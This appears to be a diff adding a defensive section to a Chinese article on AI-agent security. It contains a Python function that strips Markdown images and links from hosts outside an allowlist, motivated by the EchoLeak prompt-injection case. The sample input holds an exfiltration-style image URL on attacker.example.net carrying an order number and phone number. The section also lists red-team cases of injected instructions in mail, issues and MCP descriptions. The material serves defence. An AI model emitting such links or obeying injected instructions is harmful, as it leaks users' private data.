@@ -237,6 +237,41 @@ PocketOS 的第一环、EchoLeak 的④、GitHub MCP 的 token——凭据管理
 
 ## 七、实践建议
 
+**先跑一段：渲染前的出站白名单。** EchoLeak 的最后一环是「模型输出里的图片被自动加载，数据随 URL 发了出去」。在把输出交给前端之前过一遍：
+
+```python title="sanitize：图片只许白名单域名，其余链接降级为文字"
+import re
+from urllib.parse import urlparse
+
+ALLOWED_HOSTS = {"docs.example.com", "cdn.example.com"}
+MARKDOWN_LINK = re.compile(r"(!?)\[([^\]]*)\]\(([^)\s]+)[^)]*\)")
+
+
+def sanitize(markdown: str) -> str:
+    """渲染模型输出之前：图片只许来自白名单域名，其他链接降级成纯文字。"""
+    def replace(match: re.Match) -> str:
+        is_image, text, url = match.group(1), match.group(2), match.group(3)
+        host = urlparse(url).hostname or ""
+        if host in ALLOWED_HOSTS:
+            return match.group(0)
+        if is_image:
+            return "[已移除外部图片]"                # 图片会自动加载：一次渲染就是一次对外请求
+        return f"{text}（链接已移除：{host}）"       # 普通链接至少要用户点，降级成文字
+    return MARKDOWN_LINK.sub(replace, markdown)
+
+
+answer = ("退货流程见 [帮助中心](https://docs.example.com/refund)。"
+          "![状态](https://attacker.example.net/p.png?d=order-A1024-phone-13800000000)"
+          " 更多信息请看 [这里](https://evil.example.org/login)。")
+print(sanitize(answer))
+```
+
+```text title="运行输出（Python 3.12，只用标准库）"
+退货流程见 [帮助中心](https://docs.example.com/refund)。[已移除外部图片] 更多信息请看 这里（链接已移除：evil.example.org）。
+```
+
+白名单内的帮助中心链接原样保留；带着订单号和手机号的外部图片被拿掉，它本来会在渲染的一瞬间把数据发给第三方；另一个外部链接降级成文字。正则只覆盖标准的 Markdown 写法，生产环境应在 Markdown 解析成语法树之后过滤，并配上浏览器的 CSP 作为第二道。
+
 1. **用 OWASP 对应表自检**：十条各指向哪个已有机制，空的补。
 2. **跑四个事件的红队用例**：邮件 / 文档里的外传指令 + 引用式 Markdown 图片；公开 issue 里的跨仓库指令；MCP 描述里的指令；写配置文件的指令——看哪一环拦住了、哪一环没有。
 3. **agent 自身配置不可写**：配置、规则、hooks、MCP 清单、沙箱策略进 deny，变更需人工确认。
